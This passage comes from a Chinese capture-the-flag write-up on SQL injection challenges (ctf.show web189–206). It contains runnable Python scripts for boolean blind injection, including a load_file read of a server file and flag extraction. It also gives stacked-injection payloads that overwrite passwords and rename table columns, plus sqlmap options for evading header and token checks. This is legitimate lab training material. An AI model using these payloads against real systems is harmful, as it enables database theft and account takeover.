<span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">100</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">for</span> j <span class="token keyword">in</span> letter<span class="token punctuation">:</span>
        payload <span class="token operator">=</span> <span class="token punctuation">{</span>
            <span class="token string">"username"</span><span class="token punctuation">:</span> <span class="token string">"if(load_file('/var/www/html/api/index.php')regexp('{}'),0,1)"</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>flag <span class="token operator">+</span> j<span class="token punctuation">)</span><span class="token punctuation">,</span>
            <span class="token string">"password"</span><span class="token punctuation">:</span> <span class="token string">"0"</span>

        <span class="token punctuation">}</span>
        r <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token operator">=</span>url<span class="token punctuation">,</span>data<span class="token operator">=</span>payload<span class="token punctuation">)</span>
        <span class="token comment" spellcheck="true">#print(r)</span>
        <span class="token keyword">if</span> <span class="token string">"密码错误"</span> <span class="token operator">==</span> r<span class="token punctuation">.</span>json<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token string">'msg'</span><span class="token punctuation">]</span><span class="token punctuation">:</span>
            flag <span class="token operator">+=</span> j
            <span class="token keyword">print</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span>
            <span class="token keyword">break</span>
        <span class="token keyword">if</span> <span class="token string">'}'</span> <span class="token keyword">in</span> flag<span class="token punctuation">:</span>
            sys<span class="token punctuation">.</span>exit<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>是否注入成功利用的是mysql中的弱比较的返回值“密码错误”</p>
<h1 id="web190——bool盲注"><a href="#web190——bool盲注" class="headerlink" title="web190——bool盲注"></a>web190——bool盲注</h1><p><strong>查询语句</strong></p>
<pre class="line-numbers language-php"><code class="language-php"><span class="token comment" spellcheck="true">//拼接sql语句查找指定ID用户</span>
  <span class="token variable">$sql</span> <span class="token operator">=</span> <span class="token string">"select pass from ctfshow_user where username = '{$username}'"</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
<p><strong>返回逻辑</strong></p>
<pre class="line-numbers language-php"><code class="language-php">  <span class="token comment" spellcheck="true">//密码检测</span>
  <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">is_numeric</span><span class="token punctuation">(</span><span class="token variable">$password</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
    <span class="token variable">$ret</span><span class="token punctuation">[</span><span class="token string">'msg'</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token string">'密码只能为数字'</span><span class="token punctuation">;</span>
    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token function">json_encode</span><span class="token punctuation">(</span><span class="token variable">$ret</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span>

  <span class="token comment" spellcheck="true">//密码判断</span>
  <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$row</span><span class="token punctuation">[</span><span class="token string">'pass'</span><span class="token punctuation">]</span><span class="token operator">==</span><span class="token variable">$password</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
      <span class="token variable">$ret</span><span class="token punctuation">[</span><span class="token string">'msg'</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token string">'登陆成功'</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

  <span class="token comment" spellcheck="true">//TODO:感觉少了个啥，奇怪</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p><strong>python脚本</strong></p>
<pre class="line-numbers language-python"><code class="language-python"><span class="token comment" spellcheck="true"># -*- coding: utf-8 -*-</span>
<span class="token comment" spellcheck="true"># @Author  : Yn8rt</span>
<span class="token comment" spellcheck="true"># @Time    : 2021/7/30 16:16</span>
<span class="token comment" spellcheck="true"># @Function:</span>
<span class="token keyword">import</span> requests

url <span class="token operator">=</span> <span class="token string">'http://ba83b7e4-1f63-428d-aa58-589b7afe233a.challenge.ctf.show:8080/api/'</span>
flag <span class="token operator">=</span> <span class="token string">""</span>
i <span class="token operator">=</span> <span class="token number">0</span>

<span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>
    i <span class="token operator">=</span> i <span class="token operator">+</span> <span class="token number">1</span>
    head <span class="token operator">=</span> <span class="token number">32</span>
    tail <span class="token operator">=</span> <span class="token number">127</span>

    <span class="token keyword">while</span> head <span class="token operator">&lt;</span> tail<span class="token punctuation">:</span>
        mid <span class="token operator">=</span> <span class="token punctuation">(</span>head <span class="token operator">+</span> tail<span class="token punctuation">)</span> <span class="token operator">>></span> <span class="token number">1</span>
        <span class="token comment" spellcheck="true"># 查数据库</span>
        payload <span class="token operator">=</span> <span class="token string">"database()"</span>
        <span class="token comment" spellcheck="true"># 查表</span>
        <span class="token comment" spellcheck="true"># payload = "select group_concat(table_name) from information_schema.tables where table_schema=database()"</span>
        <span class="token comment" spellcheck="true"># 查字段</span>
        <span class="token comment" spellcheck="true"># payload = "select group_concat(column_name) from information_schema.columns where table_name='ctfshow_fl0g'"</span>
        <span class="token comment" spellcheck="true"># 查flag</span>
        <span class="token comment" spellcheck="true">#payload = "select group_concat(f1ag) from ctfshow_fl0g"</span>
        data <span class="token operator">=</span> <span class="token punctuation">{</span>
            <span class="token string">'username'</span><span class="token punctuation">:</span> f<span class="token string">"admin' and if(ascii(substr(({payload}),{i},1))>{mid},1,0)='1"</span><span class="token punctuation">,</span>
            <span class="token string">'password'</span><span class="token punctuation">:</span> <span class="token string">'1'</span>
        <span class="token punctuation">}</span>

        r <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token operator">=</span>url<span class="token punctuation">,</span>data<span class="token operator">=</span>data<span class="token punctuation">)</span>
        <span class="token keyword">if</span> <span class="token string">"密码错误"</span>  <span class="token operator">==</span> r<span class="token punctuation">.</span>json<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token string">'msg'</span><span class="token punctuation">]</span><span class="token punctuation">:</span>
            head <span class="token operator">=</span> mid <span class="token operator">+</span> <span class="token number">1</span>
        <span class="token keyword">else</span><span class="token punctuation">:</span>
            tail <span class="token operator">=</span> mid

    <span class="token keyword">if</span> head <span class="token operator">!=</span> <span class="token number">32</span><span class="token punctuation">:</span>
        flag <span class="token operator">+=</span> chr<span class="token punctuation">(</span>head<span class="token punctuation">)</span>
    <span class="token keyword">else</span><span class="token punctuation">:</span>
        <span class="token keyword">break</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h1 id="web191——ord代替ascii"><a href="#web191——ord代替ascii" class="headerlink" title="web191——ord代替ascii"></a>web191——ord代替ascii</h1><p><strong>返回逻辑</strong></p>
<pre class="line-numbers language-php"><code class="language-php">  <span class="token comment" spellcheck="true">//密码检测</span>
  <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">is_numeric</span><span class="token punctuation">(</span><span class="token variable">$password</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
    <span class="token variable">$ret</span><span class="token punctuation">[</span><span class="token string">'msg'</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token string">'密码只能为数字'</span><span class="token punctuation">;</span>
    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token function">json_encode</span><span class="token punctuation">(</span><span class="token variable">$ret</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span>

  <span class="token comment" spellcheck="true">//密码判断</span>
  <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$row</span><span class="token punctuation">[</span><span class="token string">'pass'</span><span class="token punctuation">]</span><span class="token operator">==</span><span class="token variable">$password</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
      <span class="token variable">$ret</span><span class="token punctuation">[</span><span class="token string">'msg'</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token string">'登陆成功'</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

  <span class="token comment" spellcheck="true">//TODO:感觉少了个啥，奇怪</span>
    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">'/file|into|ascii/i'</span><span class="token punctuation">,</span> <span class="token variable">$username</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
        <span class="token variable">$ret</span><span class="token punctuation">[</span><span class="token string">'msg'</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token string">'用户名非法'</span><span class="token punctuation">;</span>
        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token function">json_encode</span><span class="token punctuation">(</span><span class="token variable">$ret</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>将190脚本修改即可</p>
<h1 id="web192——bool盲注"><a href="#web192——bool盲注" class="headerlink" title="web192——bool盲注"></a>web192——bool盲注</h1><pre class="line-numbers language-python"><code class="language-python"><span class="token comment" spellcheck="true"># -*- coding: utf-8 -*-</span>
<span class="token comment" spellcheck="true"># @Author  : Yn8rt</span>
<span class="token comment" spellcheck="true"># @Time    : 2021/7/30 16:16</span>
<span class="token comment" spellcheck="true"># @Function:</span>
<span class="token keyword">import</span> requests

url <span class="token operator">=</span> <span class="token string">'http://ba83b7e4-1f63-428d-aa58-589b7afe233a.challenge.ctf.show:8080/api/'</span>
flag <span class="token operator">=</span> <span class="token string">""</span>
i <span class="token operator">=</span> <span class="token number">0</span>

<span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>
    i <span class="token operator">=</span> i <span class="token operator">+</span> <span class="token number">1</span>
    head <span class="token operator">=</span> <span class="token number">32</span>
    tail <span class="token operator">=</span> <span class="token number">127</span>

    <span class="token keyword">while</span> head <span class="token operator">&lt;</span> tail<span class="token punctuation">:</span>
        mid <span class="token operator">=</span> <span class="token punctuation">(</span>head <span class="token operator">+</span> tail<span class="token punctuation">)</span> <span class="token operator">>></span> <span class="token number">1</span>
        <span class="token comment" spellcheck="true"># 查数据库</span>
        payload <span class="token operator">=</span> <span class="token string">"database()"</span>
        <span class="token comment" spellcheck="true"># 查表</span>
        <span class="token comment" spellcheck="true"># payload = "select group_concat(table_name) from information_schema.tables where table_schema=database()"</span>
        <span class="token comment" spellcheck="true"># 查字段</span>
        <span class="token comment" spellcheck="true"># payload = "select group_concat(column_name) from information_schema.columns where table_name='ctfshow_fl0g'"</span>
        <span class="token comment" spellcheck="true"># 查flag</span>
        <span class="token comment" spellcheck="true">#payload = "select group_concat(f1ag) from ctfshow_fl0g"</span>
        data <span class="token operator">=</span> <span class="token punctuation">{</span>
            <span class="token string">'username'</span><span class="token punctuation">:</span> f<span class="token string">"admin' and if(ascii(substr(({payload}),{i},1))>{mid},1,0)='1"</span><span class="token punctuation">,</span>
            <span class="token string">'password'</span><span class="token punctuation">:</span> <span class="token string">'1'</span>
        <span class="token punctuation">}</span>

        r <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token operator">=</span>url<span class="token punctuation">,</span>data<span class="token operator">=</span>data<span class="token punctuation">)</span>
        <span class="token keyword">if</span> <span class="token string">"密码错误"</span>  <span class="token operator">==</span> r<span class="token punctuation">.</span>json<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token string">'msg'</span><span class="token punctuation">]</span><span class="token punctuation">:</span>
            head <span class="token operator">=</span> mid <span class="token operator">+</span> <span class="token number">1</span>
        <span class="token keyword">else</span><span class="token punctuation">:</span>
            tail <span class="token operator">=</span> mid

    <span class="token keyword">if</span> head <span class="token operator">!=</span> <span class="token number">32</span><span class="token punctuation">:</span>
        flag <span class="token operator">+=</span> chr<span class="token punctuation">(</span>head<span class="token punctuation">)</span>
    <span class="token keyword">else</span><span class="token punctuation">:</span>
        <span class="token keyword">break</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h1 id="web193——bool盲注"><a href="#web193——bool盲注" class="headerlink" title="web193——bool盲注"></a>web193——bool盲注</h1><p>禁用substr</p>
<pre class="line-numbers language-python"><code class="language-python"><span class="token comment" spellcheck="true"># -*- coding: utf-8 -*-</span>
<span class="token comment" spellcheck="true"># @Author  : Yn8rt</span>
<span class="token comment" spellcheck="true"># @Time    : 2021/8/3 16:46</span>
<span class="token comment" spellcheck="true"># @Function:</span>
<span class="token keyword">import</span> requests
<span class="token keyword">import</span> sys
url <span class="token operator">=</span> <span class="token string">'http://955bf0a2-3516-4e57-9534-f5029f4ada04.challenge.ctf.show:8080/api/'</span>
flag <span class="token operator">=</span> <span class="token string">'ctfshow{'</span>
letter <span class="token operator">=</span> <span class="token string">'0123456789abcdefghijklmnopqrstuvwxyz-_,{}'</span>

<span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">100</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">for</span> j <span class="token keyword">in</span> letter<span class="token punctuation">:</span>
        payload <span class="token operator">=</span> <span class="token string">"' or if((select group_concat(f1ag) from ctfshow_flxg) like '{}',1,0) ='1"</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>flag<span class="token operator">+</span>j<span class="token operator">+</span><span class="token string">"%"</span><span class="token punctuation">)</span>
        data<span class="token operator">=</span><span class="token punctuation">{</span>
            <span class="token string">'username'</span><span class="token punctuation">:</span>payload<span class="token punctuation">,</span>
            <span class="token string">'password'</span><span class="token punctuation">:</span><span class="token number">1</span>
        <span class="token punctuation">}</span>
        res <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token operator">=</span>url<span class="token punctuation">,</span>data<span class="token operator">=</span>data<span class="token punctuation">)</span>
        <span class="token keyword">if</span> <span class="token string">"密码错误"</span> <span class="token operator">==</span> res<span class="token punctuation">.</span>json<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token string">'msg'</span><span class="token punctuation">]</span><span class="token punctuation">:</span>
            flag <span class="token operator">+=</span> j
            <span class="token keyword">print</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span>
            <span class="token keyword">break</span>
        <span class="token keyword">if</span> <span class="token string">"}"</span> <span class="token keyword">in</span> flag<span class="token punctuation">:</span>
            sys<span class="token punctuation">.</span>exit<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h1 id="web194——bool盲注、LOCATE"><a href="#web194——bool盲注、LOCATE" class="headerlink" title="web194——bool盲注、LOCATE"></a>web194——bool盲注、<code>LOCATE</code></h1><p>用到了<code>locate</code></p>
<p><code>LOCATE(substr,string)</code><br>返回字符串<code>string</code>中<strong>第一次</strong>出现子字符串的位置 <code>subtr</code>，从1开始计数<br>例如：SELECT LOCATE(‘2’, ‘123’) 返回 2</p>
<p><strong>payload：</strong></p>
<p><code>payload=&quot;&#39; or if((locate(&#39;{}&#39;,(select group_concat(f1ag) from ctfshow_flxg limit 0,1))=1),1,2)=&#39;1&quot;.format(flag+j)</code></p>
<p>接下来一个括号一个括号的分析：</p>
<p><code>select group_concat(f1ag) from ctfshow_flxg limit 0,1</code>=ctfshow{123456789}</p>
<p><code>locate(&#39;ctfshow{&#39;,(ctfshow{123456789}))=1</code></p>
<p>剩下if 就不解释了，可以本地试一下</p>
<p>更换上题脚本的payload即可</p>
<h1 id="web195——堆叠注入、UPDATE"><a href="#web195——堆叠注入、UPDATE" class="headerlink" title="web195——堆叠注入、UPDATE"></a>web195——堆叠注入、<code>UPDATE</code></h1><p><strong>查询语句</strong></p>
<pre class="line-numbers language-php"><code class="language-php">  <span class="token comment" spellcheck="true">//拼接sql语句查找指定ID用户</span>
  <span class="token variable">$sql</span> <span class="token operator">=</span> <span class="token string">"select pass from ctfshow_user where username = {$username};"</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
<p><strong>返回逻辑</strong></p>
<pre class="line-numbers language-php"><code class="language-php">  <span class="token comment" spellcheck="true">//密码检测</span>
  <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">is_numeric</span><span class="token punctuation">(</span><span class="token variable">$password</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
    <span class="token variable">$ret</span><span class="token punctuation">[</span><span class="token string">'msg'</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token string">'密码只能为数字'</span><span class="token punctuation">;</span>
    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token function">json_encode</span><span class="token punctuation">(</span><span class="token variable">$ret</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span>

  <span class="token comment" spellcheck="true">//密码判断</span>
  <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$row</span><span class="token punctuation">[</span><span class="token string">'pass'</span><span class="token punctuation">]</span><span class="token operator">==</span><span class="token variable">$password</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
      <span class="token variable">$ret</span><span class="token punctuation">[</span><span class="token string">'msg'</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token string">'登陆成功'</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

  <span class="token comment" spellcheck="true">//TODO:感觉少了个啥，奇怪,不会又双叒叕被一血了吧</span>
  <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">'/ |\*|\x09|\x0a|\x0b|\x0c|\x0d|\xa0|\x00|\#|\x23|\'|\"|select|union|or|and|\x26|\x7c|file|into/i'</span><span class="token punctuation">,</span> <span class="token variable">$username</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
    <span class="token variable">$ret</span><span class="token punctuation">[</span><span class="token string">'msg'</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token string">'用户名非法'</span><span class="token punctuation">;</span>
    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token function">json_encode</span><span class="token punctuation">(</span><span class="token variable">$ret</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span>

  <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$row</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token operator">==</span><span class="token variable">$password</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
      <span class="token variable">$ret</span><span class="token punctuation">[</span><span class="token string">'msg'</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token string">"登陆成功 flag is $flag"</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p><strong>payload：</strong></p>
<pre class="line-numbers language-mysql"><code class="language-mysql">payload="0x61646d696e;update`ctfshow_user`set`pass`=0x313131;"
# 至于为什么非得用十六进制登录，是因为下面这个没有字符串单引号包围
sql = "select pass from ctfshow_user where username = {$username};";<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
<p><code>admin</code> &lt;=&gt; <code>0x61646d696e</code></p>
<p><code>111</code>&lt;=&gt;<code>0x313131</code></p>
<h1 id="web196——bug题目"><a href="#web196——bug题目" class="headerlink" title="web196——bug题目"></a>web196——bug题目</h1><p>关键之处：<code>$row[0]==$password</code></p>
<p><code>uname：1;select(666)</code></p>
<p><code>passwd：666</code></p>
<h1 id="web197-198——堆叠注入、修改列名"><a href="#web197-198——堆叠注入、修改列名" class="headerlink" title="web197-198——堆叠注入、修改列名"></a>web197-198——堆叠注入、修改列名</h1><p>通过把密码列与id互换之后，降低密码的爆破难度，实现简单爆破密码</p>
<pre class="line-numbers language-python"><code class="language-python"><span class="token keyword">import</span> requests

url <span class="token operator">=</span> <span class="token string">"http://b126bc7c-2b32-461d-9520-30d5baf7a152.chall.ctf.show/api/"</span>
<span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">100</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">if</span> i <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">:</span>
        data <span class="token operator">=</span> <span class="token punctuation">{</span>
            <span class="token string">'username'</span><span class="token punctuation">:</span> <span class="token string">'0;alter table ctfshow_user change column `pass` `ppp` varchar(255);alter table ctfshow_user '</span>
                        <span class="token string">'change column `id` `pass` varchar(255);alter table ctfshow_user change column `ppp` `id` '</span>
                        <span class="token string">'varchar(255);'</span><span class="token punctuation">,</span>
            <span class="token string">'password'</span><span class="token punctuation">:</span> f<span class="token string">'{i}'</span>
        <span class="token punctuation">}</span>
        r <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span> data<span class="token operator">=</span>data<span class="token punctuation">)</span>
    data <span class="token operator">=</span> <span class="token punctuation">{</span>
        <span class="token string">'username'</span><span class="token punctuation">:</span> <span class="token string">'0x61646d696e'</span><span class="token punctuation">,</span>
        <span class="token string">'password'</span><span class="token punctuation">:</span> f<span class="token string">'{i}'</span>
    <span class="token punctuation">}</span>
    r <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span> data<span class="token operator">=</span>data<span class="token punctuation">)</span>
    <span class="token keyword">if</span> <span class="token string">"登陆成功"</span> <span class="token keyword">in</span> r<span class="token punctuation">.</span>json<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token string">'msg'</span><span class="token punctuation">]</span><span class="token punctuation">:</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span>r<span class="token punctuation">.</span>json<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token string">'msg'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
        <span class="token keyword">break</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h1 id="web199-200"><a href="#web199-200" class="headerlink" title="web199-200"></a>web199-200</h1><pre class="line-numbers language-python"><code class="language-python"><span class="token comment" spellcheck="true"># username=0;show tables;</span>
<span class="token comment" spellcheck="true"># pass=ctfshow_user</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
<p>非常机智的做法</p>
<h1 id="开始系统练习sqlmap的使用"><a href="#开始系统练习sqlmap的使用" class="headerlink" title="开始系统练习sqlmap的使用"></a>开始系统练习sqlmap的使用</h1><h1 id="web201"><a href="#web201" class="headerlink" title="web201"></a>web201</h1><p><strong>查询语句</strong></p>
<pre class="line-numbers language-php"><code class="language-php"><span class="token comment" spellcheck="true">//拼接sql语句查找指定ID用户</span>
<span class="token variable">$sql</span> <span class="token operator">=</span> <span class="token string">"select id,username,password from ctfshow_user where username !='flag' and id = '"</span><span class="token punctuation">.</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'id'</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token string">"';"</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
<p><strong>返回逻辑</strong></p>
<pre class="line-numbers language-php"><code class="language-php"><span class="token comment" spellcheck="true">//对传入的参数进行了过滤</span>
  <span class="token keyword">function</span> <span class="token function">waf</span><span class="token punctuation">(</span><span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
   <span class="token comment" spellcheck="true">//代码过于简单，不宜展示</span>
  <span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
<p><strong>需要学会：</strong></p>
<pre class="line-numbers language-php"><code class="language-php"> 使用<span class="token operator">--</span>user<span class="token operator">-</span>agent 指定agent
 <span class="token operator">--</span>user<span class="token operator">-</span>agent<span class="token operator">=</span><span class="token string">"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"</span>
 使用<span class="token operator">--</span>referer 绕过referer检查
 <span class="token operator">--</span>referer<span class="token operator">=</span><span class="token string">"ctf.show"</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
<p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="http://images2.5666888.xyz//image-20210806161457844.png" alt="image-20210806161457844"></p>
<p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="http://images2.5666888.xyz//image-20210806161954869.png" alt></p>
<h1 id="web202——post方法"><a href="#web202——post方法" class="headerlink" title="web202——post方法"></a>web202——post方法</h1><p><strong>使用–data 调整sqlmap的请求方式，主要针对post传参，也可以先burp抓包用-r a.txt来实现sqlmap</strong></p>
<p><code>--data=&quot;id=1&quot;</code></p>
<p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="http://images2.5666888.xyz//image-20210806184447194.png" alt></p>
<h1 id="web203——put方法"><a href="#web203——put方法" class="headerlink" title="web203——put方法"></a>web203——put方法</h1><pre><code>使用--method 调整sqlmap的请求方式

--method=&quot;xxx&quot;
强制使用给定的HTTP方法(例如：PUT)

使用--method=&quot;PUT&quot;时，需要加上
--headers=&quot;Content-Type: text/plain&quot;
否则是按表单提交的，put接收不到</code></pre><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="http://images2.5666888.xyz//image-20210807203607411.png" alt></p>
<h1 id="web204"><a href="#web204" class="headerlink" title="web204"></a>web204</h1><pre><code> 使用--cookie 提交cookie数据
 --cookie=&quot;xx=xx&quot;</code></pre><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="http://images2.5666888.xyz//image-20210807205057245.png" alt></p>
<h1 id="web205"><a href="#web205" class="headerlink" title="web205"></a>web205</h1><p>提示：<strong>api调用需要鉴权</strong></p>
<p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="http://images2.5666888.xyz//image-20210807220923417.png" alt></p>
<p>也就是因为这个的原因，所以需要设置<code>--safe-url和--safe-freq</code>，因为抓包发现，每次访问<code>index.php</code>前都会先访问<code>getToken.php</code>才能行</p>
<p><strong><code>--safe-url 设置在测试目标地址前访问的安全链接</code><br><code>--safe-freq 设置两次注入测试前访问安全链接的次数</code></strong></p>
<p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="http://images2.5666888.xyz//image-20210807221310654.png" alt></p>
<h1 id="web206"><a href="#web206" class="headerlink" title="web206"></a>web206</h1><pre class="line-numbers language-php"><code class="language-php">sql需要闭合

<span class="token comment" spellcheck="true">//拼接sql语句查找指定ID用户</span>
<span class="token variable">$sql</span> <span class="token operator">=</span> <span class="token string">"select id,username,pass from ctfshow_user where id = ('"</span><span class="token punctuation">.</span><span class="token variable">$id</span><span class="token punctuation">.</span><span class="token string">"') limit 0,1;"</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
<p>sqlmap能自动进行闭合操作</p>
